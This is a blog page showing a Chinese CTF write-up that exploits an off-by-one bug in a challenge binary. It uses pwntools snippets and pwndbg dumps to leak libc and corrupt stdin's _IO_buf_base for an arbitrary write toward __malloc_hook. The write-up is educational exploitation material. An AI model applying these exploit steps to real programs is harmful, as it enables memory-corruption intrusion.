<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/14/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/14/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/02/stdin%E4%BB%BB%E6%84%8F%E5%86%99/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/02/stdin%E4%BB%BB%E6%84%8F%E5%86%99/" class="post-title-link" itemprop="url">Stdin任意写</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-02 01:49:44" itemprop="dateCreated datePublished" datetime="2022-04-02T01:49:44+08:00">2022-04-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-03 17:19:27" itemprop="dateModified" datetime="2022-04-03T17:19:27+08:00">2022-04-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>10k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>stackoverflow 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./stackoverflow</span><br><span class="line">leave your name, bro:ywx</span><br><span class="line">worrier ywx</span><br><span class="line">, now begin your challengeWelcome to stackoverflow challenge!!!</span><br><span class="line">it is really easy</span><br><span class="line">please input the size to trigger stackoverflow: </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">stackoverflow: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.24</span><span class="number">-9u</span>buntu2_amd64/ld<span class="number">-2.24</span>.so, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">8f</span>56f5f4fdfef79fe7ba6b8b8b042d5ee2b6101b, stripped</span><br><span class="line"></span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/stackoverflow&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x3ff000</span>)</span><br><span class="line">    RUNPATH:  <span class="string">&#x27;/home/yhellow/tools/glibc-all-in-one/libs/2.24-9ubuntu2_amd64/&#x27;</span></span><br></pre></td></tr></table></figure>
<p>64位，dynamically，开了NX，开了canary，Full RELRO</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.24</span><span class="number">-9u</span>buntu2<span class="number">.2</span>)</span> stable release versi</span></span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">leak</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">104</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;leave your name, bro:&quot;</span>);</span><br><span class="line">  read_s(v1, <span class="number">80</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;worrier %s, now begin your challenge&quot;</span>, v1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数没有溢出，就是让我们来 leak libc_base 的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">pwn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> data; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;data);</span><br><span class="line">  IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">  v2 = data;</span><br><span class="line">  <span class="keyword">while</span> ( data &gt; <span class="number">3145728</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;too much bytes to do stackoverflow.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;data);</span><br><span class="line">    IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);</span><br><span class="line">  chunk_list = (__int64)<span class="built_in">malloc</span>(data + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !chunk_list )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;padding and ropchain: &quot;</span>);</span><br><span class="line">  read_s((<span class="keyword">void</span> *)chunk_list, data);</span><br><span class="line">  *(_BYTE *)(chunk_list + v2) = <span class="number">0</span>;              <span class="comment">// 末尾置空:off-by-one</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>末尾字节置空，导致 off-by-one</p>
<p>data 的大小不能超过“3145728”，否则重新输入，但是后面却根据“v2”的大小来进行索引置空，也许有用</p>
<p><strong>入侵思路</strong></p>
<p>先获取 libc_base </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fffffffde60</span> ◂— <span class="number">0x5000000000</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fffffffde68</span> —▸ <span class="number">0x7fffffffde90</span> ◂— <span class="number">0x3131313131313131</span> (<span class="string">&#x27;11111111&#x27;</span>)</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7fffffffde70</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7fffffffde78</span> ◂— <span class="number">0x2711fc69c0f4a500</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ rbp <span class="number">0x7fffffffde80</span> —▸ <span class="number">0x7fffffffdf00</span> —▸ <span class="number">0x7fffffffdf20</span> —▸ <span class="number">0x400ae0</span> ◂— <span class="number">0x41ff894156415741</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fffffffde88</span> —▸ <span class="number">0x400a34</span> ◂— <span class="number">0xbfc6894890458d48</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│ rsi <span class="number">0x7fffffffde90</span> ◂— <span class="number">0x3131313131313131</span> (<span class="string">&#x27;11111111&#x27;</span>)</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7fffffffde98</span> —▸ <span class="number">0x7ffff7a8dd0a</span> (_IO_default_xsgetn+<span class="number">634</span>) ◂— <span class="number">0x554100401f0fffff</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│     <span class="number">0x7fffffffdea0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│     <span class="number">0x7fffffffdea8</span> —▸ <span class="number">0x7ffff7dd2600</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad2887</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;leave your name, bro:&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;1&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;worrier 11111111&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;,&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr-<span class="number">515410</span></span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="string">&#x27;malloc_hook &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br></pre></td></tr></table></figure>
<p>程序有 off-by-one ，但和传统菜单题还不一样，它没有修改模块或者释放模块，只能进行申请操作，并且申请之后的 chunk 只有一次输入机会，此后便不能控制了</p>
<p>我用已知的知识就只能走到这里了（后面的内容涉及到 stdin_任意写）</p>
<p>libc-2.24 版本有一个特点：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *<span class="built_in">stdin</span></span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  _flags = <span class="number">-72540021</span>,</span><br><span class="line">  _IO_read_ptr = <span class="number">0x7febfb4bd943</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _IO_read_end = <span class="number">0x7febfb4bd943</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _IO_read_base = <span class="number">0x7febfb4bd943</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _IO_write_base = <span class="number">0x7febfb4bd943</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _IO_write_ptr = <span class="number">0x7febfb4bd943</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _IO_write_end = <span class="number">0x7febfb4bd943</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _IO_buf_base = <span class="number">0x7febfb4bd943</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _IO_buf_end = <span class="number">0x7febfb4bd944</span> &lt;_IO_2_1_stdin_+<span class="number">132</span>&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">  _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">  _markers = <span class="number">0x0</span>,</span><br><span class="line">  _chain = <span class="number">0x0</span>,</span><br><span class="line">  _fileno = <span class="number">0</span>,</span><br><span class="line">  _flags2 = <span class="number">16</span>,</span><br><span class="line">  _old_offset = <span class="number">-1</span>,</span><br><span class="line">  _cur_column = <span class="number">0</span>,</span><br><span class="line">  _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">  _shortbuf = <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _lock = <span class="number">0x7febfb4bf770</span> &lt;_IO_stdfile_0_lock&gt;,</span><br><span class="line">  _offset = <span class="number">-1</span>,</span><br><span class="line">  _codecvt = <span class="number">0x0</span>,</span><br><span class="line">  _wide_data = <span class="number">0x7febfb4bd9a0</span> &lt;_IO_wide_data_0&gt;,</span><br><span class="line">  _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">  _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">  __pad5 = <span class="number">0</span>,</span><br><span class="line">  _mode = <span class="number">-1</span>,</span><br><span class="line">  _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg &amp; *<span class="built_in">stdin</span></span><br><span class="line"><span class="number">0x7febfb4bd8c0</span> &lt;_IO_2_1_stdin_&gt;:	<span class="number">0x00000000fbad208b</span>	<span class="number">0x00007febfb4bd943</span></span><br><span class="line"><span class="number">0x7febfb4bd8d0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;:	<span class="number">0x00007febfb4bd943</span>	<span class="number">0x00007febfb4bd943</span></span><br><span class="line"><span class="number">0x7febfb4bd8e0</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;:	<span class="number">0x00007febfb4bd943</span>	<span class="number">0x00007febfb4bd943</span></span><br><span class="line">    <span class="comment">/* _IO_write_base  _IO_write_ptr */</span></span><br><span class="line"><span class="number">0x7febfb4bd8f0</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;:	<span class="number">0x00007febfb4bd943</span>	<span class="number">0x00007febfb4bd943</span></span><br><span class="line">    <span class="comment">/* _IO_write_end  _IO_buf_base */</span></span><br><span class="line"><span class="number">0x7febfb4bd900</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;:	<span class="number">0x00007febfb4bd944</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">/* _IO_buf_end */</span></span><br><span class="line"><span class="number">0x7febfb4bd910</span> &lt;_IO_2_1_stdin_+<span class="number">80</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p><code>stdin</code> 结构体中存储 <code>_IO_buf_end</code> 指针内存地址的末尾刚好为 <code>\x00</code> ，若利用漏洞我们将 <code>_IO_buf_base</code> 末尾写 <code>\x00</code> ，则会使得 <code>_IO_buf_base</code> 指向 <code>stdin</code> 结构体中存储 <code>_IO_buf_end</code> 指针内存地址，即可利用输入缓冲区覆盖 <code>_IO_buf_end</code> </p>
<p>接下来就是思考怎样才能把“\x00”覆盖到 “_IO_buf_base”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ff3a17db010</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ff3a17db010</span> ◂— <span class="number">0x61616161</span> <span class="comment">/* &#x27;aaaa&#x27; */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg &amp; *<span class="built_in">stdin</span></span><br><span class="line"><span class="number">0x7ff3a1d9d8c0</span> &lt;_IO_2_1_stdin_&gt;:	<span class="number">0x00000000fbad208b</span>	<span class="number">0x00007ff3a1d9d943</span></span><br><span class="line"><span class="number">0x7ff3a1d9d8d0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;:	<span class="number">0x00007ff3a1d9d943</span>	<span class="number">0x00007ff3a1d9d943</span></span><br><span class="line"><span class="number">0x7ff3a1d9d8e0</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;:	<span class="number">0x00007ff3a1d9d943</span>	<span class="number">0x00007ff3a1d9d943</span></span><br><span class="line">    <span class="comment">/* _IO_write_base  _IO_write_ptr */</span></span><br><span class="line"><span class="number">0x7ff3a1d9d8f0</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;:	<span class="number">0x00007ff3a1d9d943</span>	<span class="number">0x00007ff3a1d9d943</span></span><br><span class="line">    <span class="comment">/* _IO_write_end  _IO_buf_base */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">7</span>]: <span class="number">0x7ff3a1d9d8f0</span>+<span class="number">0x8</span><span class="number">-0x7ff3a17db010</span></span><br><span class="line">Out[<span class="number">7</span>]: <span class="number">6039784</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: hex(<span class="number">6039784</span>)</span><br><span class="line">Out[<span class="number">8</span>]: <span class="string">&#x27;0x5c28e8&#x27;</span></span><br></pre></td></tr></table></figure>
<p>已知了偏移，就可以写入以下代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;please input the size to trigger stackoverflow: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x5c28e8</span>))</span><br><span class="line">add(<span class="number">0x200000</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;please input the size to trigger stackoverflow: &#x27;</span>)</span><br><span class="line">p.send(p64(malloc_hook+<span class="number">8</span>))</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg &amp; *<span class="built_in">stdin</span></span><br><span class="line"><span class="number">0x7f68f09198c0</span> &lt;_IO_2_1_stdin_&gt;:	<span class="number">0x00000000fbad208b</span>	<span class="number">0x00007f68f0919900</span></span><br><span class="line"><span class="number">0x7f68f09198d0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;:	<span class="number">0x00007f68f0919900</span>	<span class="number">0x00007f68f0919900</span></span><br><span class="line"><span class="number">0x7f68f09198e0</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;:	<span class="number">0x00007f68f0919900</span>	<span class="number">0x00007f68f0919900</span></span><br><span class="line"><span class="number">0x7f68f09198f0</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;:	<span class="number">0x00007f68f0919900</span>	<span class="number">0x00007f68f0919900</span></span><br><span class="line"><span class="number">0x7f68f0919900</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;:	<span class="number">0x00007f68f0919944</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">/* 把_IO_buf_base尾字节置空以后,其他的字段都置空了(除了_IO_buf_end) */</span></span><br><span class="line">    <span class="comment">/* 因为程序用setvbuf关闭了输入输出缓冲区,所以它们4个都是同步的(一样) */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg &amp; *<span class="built_in">stdin</span></span><br><span class="line"><span class="number">0x7f68f09198c0</span> &lt;_IO_2_1_stdin_&gt;:	<span class="number">0x00000000fbad208b</span>	<span class="number">0x00007f68f0919901</span></span><br><span class="line"><span class="number">0x7f68f09198d0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;:	<span class="number">0x00007f68f0919908</span>	<span class="number">0x00007f68f0919900</span></span><br><span class="line">    <span class="comment">/* 注意一下_IO_read_ptr改变了 */</span></span><br><span class="line"><span class="number">0x7f68f09198e0</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;:	<span class="number">0x00007f68f0919900</span>	<span class="number">0x00007f68f0919900</span></span><br><span class="line"><span class="number">0x7f68f09198f0</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;:	<span class="number">0x00007f68f0919900</span>	<span class="number">0x00007f68f0919900</span></span><br><span class="line"><span class="number">0x7f68f0919900</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;:	<span class="number">0x00007f68f0919af8</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">/* malloc_hook + 8 已经写入 */</span></span><br></pre></td></tr></table></figure>
